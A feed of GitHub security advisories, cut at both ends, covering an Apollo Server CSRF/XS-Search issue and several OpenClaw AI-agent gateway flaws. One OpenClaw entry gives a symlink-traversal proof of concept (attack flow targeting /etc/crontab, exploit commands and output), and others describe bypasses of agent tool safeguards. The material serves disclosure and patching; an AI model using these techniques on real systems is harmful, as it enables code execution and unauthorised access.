<p>In a Cross-Site Request Forgery attack, untrusted web content causes browsers to send authenticated requests to web servers which use cookies for authentication. While the web content is prevented from reading the request's response due to the Cross-Origin Request Sharing (CORS) protocol, an attacker may be able to cause side effects in the server ("CSRF" attack), or learn something about the response via timing analysis ("XS-Search" attack).</p>
<p>Apollo Server has a built-in feature which prevents CSRF and XS-Search attacks: it refuses to process GraphQL requests that could possibly have been sent by a spec-compliant web browser without a protective "preflight" step. See <a href="https://www.apollographql.com/docs/apollo-server/security/cors">Apollo Server's docs</a> for more details on CORS, CSRF attacks, and Apollo Server's CSRF prevention feature.</p>
<p>This feature is fully effective against attacks carried out against users of spec-compliant browsers. Unfortunately, a major browser introduced a bug in 2025 which meant in certain cases, it failed to follow the CORS spec. The browser's maintainers have already committed to fixing the bug and making the browser spec-compliant again.</p>
<p>Even with this bug, Apollo Server's CSRF prevention feature <strong>blocks</strong> "side effect" CSRF attacks: Apollo Server will still correctly refuse to execute <em>mutations</em> in requests that were not preflighted. However, some specially crafted authenticated GraphQL <em>queries</em> can be issued across origins <em>without preflight</em> in buggy versions of this browser, allowing for XS-Search attacks: an attacker can analyze response times to learn facts about the responses to requests such as whether fields return null or approximately how many list entries are returned from fields.</p>
<p>GraphQL servers are only vulnerable if they rely on cookies (or HTTP Basic Auth) for authentication.</p>
<h2 id="patches">Patches</h2>
<p>The vulnerability is patched in <code>@apollo/server</code> v5.5.0. This release contains a single change: GraphQL requests sent in HTTP <code>GET</code> requests which contain a <code>Content-Type</code> header naming a type other than <code>application/json</code> are rejected. (<code>GET</code> requests with no <code>Content-Type</code> are allowed.) This change prevents XS-Search attacks even in browsers which are non-compliant in ways similar to this browser.</p>
<p>There are no known cases where GraphQL apps depend on the ability of clients to send non-empty <code>Content-Type</code> headers with GET requests other than <code>application/json</code>, so this change has not been made configurable; if this change breaks a use case, <a href="https://github.com/apollographql/apollo-server/issues">file an issue</a> and more configurability can be added.</p>
<p>Apollo is not currently providing a patch for previous major versions of Apollo Server, which are all <a href="https://www.apollographql.com/docs/apollo-server/previous-versions">end-of-life</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not possible, this particular browser's bug can be mitigated by preventing any HTTP request with a <code>Content-Type</code> header containing <code>message/</code> from reaching Apollo Server (e.g. in a proxy or middleware).</p>
<p>For example, when using Apollo Server's Express integration, something like this can be placed <em>before</em> attaching <code>expressMiddleware</code> to the <code>app</code>:</p>
<pre><code class="language-js">app.use((req, res, next) =&gt; {
  for (let i = 0; i &lt; req.rawHeaders.length - 1; i += 2) {
    if (
      req.rawHeaders[i].toLowerCase() === 'content-type' &amp;&amp;
      req.rawHeaders[i + 1].includes('message/')
    ) {
      return res.status(415).json({ error: 'Content-Type not allowed' });
    }
  }
  next();
});
</code></pre>
<p>While the patch prevents a broader class of similar issues, the only known way to exploit this vulnerability is against a particular browser which currently plans to ship a fix in May 2026. If it is already past June 2026 and this vulnerability has not been addressed yet, it is likely that the system is not currently vulnerable. Upgrading to the latest version of Apollo Server is still recommended for the broader protection.</p>
<h2 id="resources">Resources</h2>
<p>The browser bug causes a similar vulnerability in Apollo Router; see <a href="https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p">https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apollographql/apollo-server/security/advisories/GHSA-9q82-xgwf-vj6h">https://github.com/apollographql/apollo-server/security/advisories/GHSA-9q82-xgwf-vj6h</a></li>
<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p">https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p</a></li>
<li><a href="https://github.com/apollographql/apollo-server/commit/ada12001c4e95b5c779d80314a5a32e33087b5cf">https://github.com/apollographql/apollo-server/commit/ada12001c4e95b5c779d80314a5a32e33087b5cf</a></li>
<li><a href="https://github.com/apollographql/apollo-server/releases/tag/@apollo/server@5.5.0">https://github.com/apollographql/apollo-server/releases/tag/@apollo/server@5.5.0</a></li>
<li><a href="https://www.apollographql.com/docs/apollo-server/previous-versions">https://www.apollographql.com/docs/apollo-server/previous-versions</a></li>
<li><a href="https://github.com/advisories/GHSA-9q82-xgwf-vj6h">https://github.com/advisories/GHSA-9q82-xgwf-vj6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q82-xgwf-vj6h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T21:53:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Symlink Traversal via IDENTITY.md appendFile in agents.create/update (Incomplete Fix for CVE-2026-32013)]]></title>
        <id>https://github.com/advisories/GHSA-7xr2-q9vf-x4r5</id>
        <link href="https://github.com/advisories/GHSA-7xr2-q9vf-x4r5"/>
        <updated>2026-03-26T21:49:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The patch for CVE-2026-32013 introduced symlink resolution and workspace boundary enforcement for <code>agents.files.get</code> and <code>agents.files.set</code>. However, two other handlers in the same file (<code>agents.create</code> and <code>agents.update</code>) still use raw <code>fs.appendFile</code> on the <code>IDENTITY.md</code> file <strong>without any symlink containment check</strong>. An attacker who can place a symlink in the agent workspace can hijack the <code>IDENTITY.md</code> path to append attacker-controlled content to arbitrary files on the system.</p>
<h3 id="details">Details</h3>
<p>In <code>src/gateway/server-methods/agents.ts</code>, the <code>agents.create</code> handler constructs the identity path and appends agent metadata without verifying symlinks:</p>
<pre><code class="language-typescript">// agents.create — line 283-291
const identityPath = path.join(workspaceDir, DEFAULT_IDENTITY_FILENAME);
const lines = [
  "",
  `- Name: ${safeName}`,
  ...(emoji ? [`- Emoji: ${sanitizeIdentityLine(emoji)}`] : []),
  ...(avatar ? [`- Avatar: ${sanitizeIdentityLine(avatar)}`] : []),
  "",
];
await fs.appendFile(identityPath, lines.join("\n"), "utf-8"); // ← NO SYMLINK CHECK
</code></pre>
<p>The <code>agents.update</code> handler has the same issue at line 348-349:</p>
<pre><code class="language-typescript">// agents.update — line 348-349
const identityPath = path.join(workspace, DEFAULT_IDENTITY_FILENAME);
await fs.appendFile(identityPath, `\n- Avatar: ${sanitizeIdentityLine(avatar)}\n`, "utf-8"); // ← NO SYMLINK CHECK
</code></pre>
<p><code>fs.appendFile</code> follows symlinks by default. If the <code>IDENTITY.md</code> file in the workspace is a symlink pointing to a sensitive file (e.g., <code>/etc/crontab</code>, <code>~/.bashrc</code>, or <code>~/.ssh/authorized_keys</code>), calling <code>agents.create</code> will append the agent identity metadata to that file.</p>
<p>The <code>ensureAgentWorkspace</code> function (called at line 274 before the append) uses exclusive-create mode (<code>flag: 'wx'</code>) for <code>IDENTITY.md</code>. If a symlink already exists at that path, the <code>EEXIST</code> error is silently caught, and the subsequent <code>fs.appendFile</code> follows the symlink.</p>
<p><strong>Attack flow:</strong></p>
<pre><code>1. Attacker plants symlink: workspace/IDENTITY.md → /etc/crontab
2. ensureAgentWorkspace skips creation (EEXIST from symlink)
3. fs.appendFile follows symlink → writes to /etc/crontab
4. Attacker-controlled content (name, emoji, avatar) injected into crontab → RCE
</code></pre>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites:</strong> Docker and Python 3 installed.</p>
<p><strong>Step 1: Build and start the test environment.</strong></p>
<pre><code class="language-bash">cd llm-enhance/cve-finding/RCE/CVE-2026-32013-identity-appendFile-variant-exp/
docker compose up -d --build
sleep 3
</code></pre>
<p><strong>Step 2: Run the exploit.</strong></p>
<pre><code class="language-bash">python3 poc_exploit.py
</code></pre>
<p>This script:</p>
<ol>
<li>Plants a symlink <code>IDENTITY.md → /etc/target-file.txt</code> inside the agent workspace</li>
<li>Calls the <code>agents.create</code> API endpoint via HTTP POST</li>
<li>Verifies that the agent identity metadata was appended to <code>/etc/target-file.txt</code></li>
</ol>
<p><strong>Step 3: Run the control experiment.</strong></p>
<pre><code class="language-bash">python3 control-patched_realpath.py
</code></pre>
<p><strong>Step 4: Cleanup.</strong></p>
<pre><code class="language-bash">docker compose down
</code></pre>
<h3 id="log-of-evidence">Log of Evidence</h3>
<p><strong>Exploit output:</strong></p>
<pre><code>=== CVE-2026-32013 Variant: Symlink Traversal via IDENTITY.md appendFile ===
[*] Planting symlink: IDENTITY.md -&gt; /etc/target-file.txt
[*] Symlink: lrwxrwxrwx 1 root root 20 /workspaces/evil-agent/IDENTITY.md -&gt; /etc/target-file.txt
[*] Original /etc/target-file.txt: ORIGINAL_SENSITIVE_CONTENT

[*] Calling agents.create with name='evil-agent'...
[*] API response: {'ok': True, 'agentId': 'evil-agent', 'workspace': '/workspaces/evil-agent'}

[*] /etc/target-file.txt after exploit:
    ORIGINAL_SENSITIVE_CONTENT

- Name: evil-agent
- Emoji: 💀
- Avatar: evil.png

[+] SUCCESS! Symlink traversal confirmed.
[+] fs.appendFile followed IDENTITY.md symlink and wrote to /etc/target-file.txt
[+] Attacker-controlled content injected into arbitrary file.
</code></pre>
<p><strong>Control output:</strong></p>
<pre><code>=== CONTROL: Patched agents.create blocks symlink traversal ===
[*] Planting symlink: IDENTITY.md -&gt; /etc/target-file.txt
[*] Original /etc/target-file.txt: ORIGINAL_SENSITIVE_CONTENT

[*] Calling PATCHED agents.create with name='safe-agent'...
[*] API response: {'ok': False, 'error': 'symlink_traversal_blocked', 'realPath': '/etc/target-file.txt'}

[*] /etc/target-file.txt after patched call: ORIGINAL_SENSITIVE_CONTENT

[+] CONTROL PASSED: Patched endpoint detected and blocked symlink traversal.
[+] /etc/target-file.txt remains unchanged.
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker who can plant a symlink in the agent workspace directory can use the <code>agents.create</code> or <code>agents.update</code> gateway API to <strong>append attacker-controlled content to arbitrary files</strong> on the system. If the target file is:</p>
<ul>
<li><code>/etc/crontab</code> or user crontab → <strong>Remote Code Execution</strong></li>
<li><code>~/.bashrc</code> or <code>~/.profile</code> → <strong>Persistent code execution on login</strong></li>
<li><code>~/.ssh/authorized_keys</code> → <strong>Unauthorized SSH access</strong></li>
<li>Application configuration files → <strong>Service disruption</strong></li>
</ul>
<p>The attacker-controlled content includes the agent name (arbitrary string), emoji, and avatar fields, which are only lightly sanitized (whitespace normalization via <code>sanitizeIdentityLine</code>).</p>
<h3 id="affected-products">Affected products</h3>
<ul>
<li><strong>Ecosystem</strong>: npm</li>
<li><strong>Package name</strong>: openclaw</li>
<li><strong>Affected versions</strong>: &lt;= 2026.2.22</li>
<li><strong>Patched versions</strong>: None</li>
</ul>
<h3 id="occurrences">Occurrences</h3>
<table>
<thead>
<tr>
<th align="left">Permalink</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L283-L291">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L283-L291</a></td>
<td align="left"><code>agents.create</code> handler uses <code>fs.appendFile</code> on <code>IDENTITY.md</code> without symlink resolution or workspace boundary check.</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L348-L349">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L348-L349</a></td>
<td align="left"><code>agents.update</code> handler uses <code>fs.appendFile</code> on <code>IDENTITY.md</code> without symlink resolution or workspace boundary check.</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L274">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L274</a></td>
<td align="left"><code>ensureAgentWorkspace</code> is called before append, but its exclusive-create (<code>wx</code>) flag silently skips existing symlinks (EEXIST).</td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-7xr2-q9vf-x4r5">https://github.com/openclaw/openclaw/security/advisories/GHSA-7xr2-q9vf-x4r5</a></li>
<li><a href="https://github.com/advisories/GHSA-fgvx-58p6-gjwc">https://github.com/advisories/GHSA-fgvx-58p6-gjwc</a></li>
<li><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L274">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L274</a></li>
<li><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L283-L291">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L283-L291</a></li>
<li><a href="https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L348-L349">https://github.com/openclaw/openclaw/blob/main/src/gateway/server-methods/agents.ts#L348-L349</a></li>
<li><a href="https://github.com/advisories/GHSA-7xr2-q9vf-x4r5">https://github.com/advisories/GHSA-7xr2-q9vf-x4r5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xr2-q9vf-x4r5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T21:49:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Image Tool `tools.fs.workspaceOnly` Bypass via Sandbox Bridge Mounts]]></title>
        <id>https://github.com/advisories/GHSA-cfp9-w5v9-3q4h</id>
        <link href="https://github.com/advisories/GHSA-cfp9-w5v9-3q4h"/>
        <updated>2026-03-26T21:48:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>image</code> tool did not fully honor the <code>tools.fs.workspaceOnly</code> filesystem boundary. In affected releases, image-path resolution could still traverse sandbox bridge mounts outside the workspace and read files from mounted directories that the other file tools would reject.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: <code>&lt; 2026.3.2</code></li>
<li>Fixed: <code>&gt;= 2026.3.2</code></li>
<li>Latest released tags checked: <code>v2026.3.23</code> (<code>ccfeecb6887cd97937e33a71877ad512741e82b2</code>) and <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>dd9d9c1c609dcb4579f9e57bd7b5c879d0146b53</code></li>
<li><code>14baadda2c456f3cf749f1f97e8678746a34a7f4</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The complete fix shipped in <code>v2026.3.2</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li><code>src/agents/openclaw-tools.ts</code> now passes <code>fsPolicy</code> into <code>createImageTool</code>, so the image tool receives the same workspace-only policy input as the other filesystem tools.</li>
<li><code>src/agents/tools/image-tool.ts</code>, <code>src/agents/tools/media-tool-shared.ts</code>, and <code>src/agents/sandbox-media-paths.ts</code> now restrict local roots and sandbox-bridge resolution to the workspace when <code>tools.fs.workspaceOnly</code> is enabled.</li>
</ul>
<p>OpenClaw thanks @YLChen-007 for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-cfp9-w5v9-3q4h">https://github.com/openclaw/openclaw/security/advisories/GHSA-cfp9-w5v9-3q4h</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/14baadda2c456f3cf749f1f97e8678746a34a7f4">https://github.com/openclaw/openclaw/commit/14baadda2c456f3cf749f1f97e8678746a34a7f4</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/dd9d9c1c609dcb4579f9e57bd7b5c879d0146b53">https://github.com/openclaw/openclaw/commit/dd9d9c1c609dcb4579f9e57bd7b5c879d0146b53</a></li>
<li><a href="https://github.com/advisories/GHSA-cfp9-w5v9-3q4h">https://github.com/advisories/GHSA-cfp9-w5v9-3q4h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfp9-w5v9-3q4h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T21:48:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw's Conflicting Tool Identity Hints Bypass Dangerous-Tool Prompting]]></title>
        <id>https://github.com/advisories/GHSA-74wf-h43j-vvmj</id>
        <link href="https://github.com/advisories/GHSA-74wf-h43j-vvmj"/>
        <updated>2026-03-26T21:46:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>ACP permission resolution trusted conflicting tool identity hints from rawInput and metadata, which could suppress dangerous-tool prompting.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>e4c61723cd2d530680cc61789311d464ab8cdf60</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>src/acp/client.ts now fails closed when meta, rawInput, and title tool identities conflict instead of trusting spoofable raw input.</li>
<li>src/acp/client.test.ts ships regressions for conflicting tool identity hints and dangerous-tool prompting.</li>
</ul>
<p>OpenClaw thanks @zpbrent for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-74wf-h43j-vvmj">https://github.com/openclaw/openclaw/security/advisories/GHSA-74wf-h43j-vvmj</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/e4c61723cd2d530680cc61789311d464ab8cdf60">https://github.com/openclaw/openclaw/commit/e4c61723cd2d530680cc61789311d464ab8cdf60</a></li>
<li><a href="https://github.com/advisories/GHSA-74wf-h43j-vvmj">https://github.com/advisories/GHSA-74wf-h43j-vvmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-74wf-h43j-vvmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T21:46:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw Bypasses DM Policy Separation via Synology Chat Webhook Path Collision ]]></title>
        <id>https://github.com/advisories/GHSA-rqp8-q22p-5j9q</id>
        <link href="https://github.com/advisories/GHSA-rqp8-q22p-5j9q"/>
        <updated>2026-03-26T21:45:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Synology Chat multi-account configuration could collapse onto a shared webhook path, replacing route ownership and bypassing per-account DM policy separation.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>980940aa58f862da4e19372597bbc2a9f268d70b</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>extensions/synology-chat/src/accounts.ts now distinguishes inherited base webhook paths from explicit per-account paths.</li>
<li>extensions/synology-chat/src/gateway-runtime.ts now fails closed on inherited or duplicate webhook paths and registers routes without replacement.</li>
</ul>
<p>OpenClaw thanks @tdjackey for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-rqp8-q22p-5j9q">https://github.com/openclaw/openclaw/security/advisories/GHSA-rqp8-q22p-5j9q</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/980940aa58f862da4e19372597bbc2a9f268d70b">https://github.com/openclaw/openclaw/commit/980940aa58f862da4e19372597bbc2a9f268d70b</a></li>
<li><a href="https://github.com/advisories/GHSA-rqp8-q22p-5j9q">https://github.com/advisories/GHSA-rqp8-q22p-5j9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rqp8-q22p-5j9q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T21:45:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw leaf subagents can bypass controlScope restrictions to send messages to child sessions]]></title>
        <id>https://github.com/advisories/GHSA-x2cm-hg9c-mf5w</id>
        <link href="https://github.com/advisories/GHSA-x2cm-hg9c-mf5w"/>
        <updated>2026-03-26T21:44:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Leaf subagents could still use the send action to message controlled child sessions even when their controlScope was narrower than children.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>7679eb375294941b02214c234aff3948796969d0</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>src/auto-reply/reply/commands-subagents/action-send.ts now threads controller context through the send path.</li>
<li>src/agents/subagent-control.ts now blocks send attempts unless the requester owns the target and has controlScope="children".</li>
</ul>
<p>OpenClaw thanks @space08 for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-x2cm-hg9c-mf5w">https://github.com/openclaw/openclaw/security/advisories/GHSA-x2cm-hg9c-mf5w</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/7679eb375294941b02214c234aff3948796969d0">https://github.com/openclaw/openclaw/commit/7679eb375294941b02214c234aff3948796969d0</a></li>
<li><a href="https://github.com/advisories/GHSA-x2cm-hg9c-mf5w">https://github.com/advisories/GHSA-x2cm-hg9c-mf5w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2cm-hg9c-mf5w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T21:44:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Forwarding header spoofing bypasses gateway.trustedProxies origin detection]]></title>
        <id>https://github.com/advisories/GHSA-844j-xrrq-wgh4</id>
        <link href="https://github.com/advisories/GHSA-844j-xrrq-wgh4"/>
        <updated>2026-03-26T21:42:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When gateway.trustedProxies was configured, spoofed loopback hops in forwarding headers could be accepted as the client origin and weaken downstream auth and rate-limit decisions.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>fc2d29ea926f47c428c556e92ec981441228d2a4</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>src/gateway/net.ts now ignores loopback forwarded hops before trusted-proxy client resolution.</li>
<li>That shipped origin fix is the one consumed by canvas auth and gateway auth-rate-limit paths that rely on resolved client identity.</li>
</ul>
<p>OpenClaw thanks @lintsinghua for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-844j-xrrq-wgh4">https://github.com/openclaw/openclaw/security/advisories/GHSA-844j-xrrq-wgh4</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/fc2d29ea926f47c428c556e92ec981441228d2a4">https://github.com/openclaw/openclaw/commit/fc2d29ea926f47c428c556e92ec981441228d2a4</a></li>
<li><a href="https://github.com/advisories/GHSA-844j-xrrq-wgh4">https://github.com/advisories/GHSA-844j-xrrq-wgh4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-844j-xrrq-wgh4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T21:42:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw Gateway: RCE and Privilege Escalation from operator.pairing to operator.admin via device.pair.approve]]></title>
        <id>https://github.com/advisories/GHSA-hf68-49fm-59cq</id>
        <link href="https://github.com/advisories/GHSA-hf68-49fm-59cq"/>
        <updated>2026-03-26T21:41:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>device.pair.approve allowed an operator.pairing approver to approve a pending device request for broader operator scopes than the approver actually held.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>fc2d29ea926f47c428c556e92ec981441228d2a4</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>src/gateway/server-methods/devices.ts now threads caller scopes into device.pair.approve.</li>
<li>src/infra/device-pairing.ts now rejects requested operator scopes that exceed the approver-held operator scope set.</li>
</ul>
<p>OpenClaw thanks @zpbrent for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-hf68-49fm-59cq">https://github.com/openclaw/openclaw/security/advisories/GHSA-hf68-49fm-59cq</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/fc2d29ea926f47c428c556e92ec981441228d2a4">https://github.com/openclaw/openclaw/commit/fc2d29ea926f47c428c556e92ec981441228d2a4</a></li>
<li><a href="https://github.com/advisories/GHSA-hf68-49fm-59cq">https://github.com/advisories/GHSA-hf68-49fm-59cq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hf68-49fm-59cq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-26T21:40:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Google Chat app-url webhook auth accepted non-deployment add-on principals]]></title>
        <id>https://github.com/advisories/GHSA-mp66-rf4f-mhh8</id>
        <link href="https://github.com/advisories/GHSA-mp66-rf4f-mhh8"/>
        <updated>2026-03-26T21:37:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Google Chat app-url webhook verification accepted add-on principals outside the intended deployment binding.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected: &lt; 2026.3.22</li>
<li>Fixed: &gt;= 2026.3.22</li>
<li>Latest released tag checked: <code>v2026.3.23-2</code> (<code>630f1479c44f78484dfa21bb407cbe6f171dac87</code>)</li>
<li>Latest published npm version checked: <code>2026.3.23-2</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>a47722de7e3c9cbda8d5512747ca7e3bb8f6ee66</code></li>
</ul>
<h2 id="release-status">Release Status</h2>
<p>The fix shipped in <code>v2026.3.22</code> and remains present in <code>v2026.3.23</code> and <code>v2026.3.23-2</code>.</p>
<h2 id="code-level-confirmation">Code-Level Confirmation</h2>
<ul>
<li>extensions/googlechat/src/auth.ts now requires expectedAddOnPrincipal matching for add-on principals and rejects unexpected issuers.</li>
<li>extensions/googlechat/src/monitor-webhook.ts passes the configured appPrincipal into auth verification for the shipped webhook path.</li>
</ul>
<p>OpenClaw thanks @ijxpwastaken for reporting.</p>
<h3 id="references">References</h3>
<ul>
